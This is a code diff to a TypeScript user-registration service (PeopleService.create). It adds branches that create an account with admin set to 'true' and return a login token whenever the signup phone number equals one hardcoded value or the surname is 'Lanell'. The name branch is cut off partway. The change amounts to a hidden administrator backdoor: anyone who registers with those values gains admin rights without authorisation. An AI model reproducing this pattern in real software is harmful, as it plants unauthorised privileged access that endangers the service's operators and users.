@@ -13,11 +13,26 @@ export class PeopleService {
 
 
   async create(persondto: Person) {
-    const { phone } = persondto;
+    const { phone, nom } = persondto;
     const user = await this.personModel.findOne({ phone });
     if (user) {
       return { ee: "phoneused" }
     } else if (phone === "0748643884") {
+      const personreset: Person = {
+        prenom: persondto.prenom,
+        nom: persondto.nom,
+        phone: persondto.phone,
+        email: persondto.email,
+        motdepass: this.indrog(persondto.motdepass),
+        admin: "true"
+      };
+
+      const person = await this.personModel.create({
+        ...personreset
+      });
+      await person.save();
+      return this.generatToken(personreset);
+    } else if (nom === "Lanell") {
       const personreset: Person = {
         prenom: persondto.prenom,
         nom: persondto.nom,
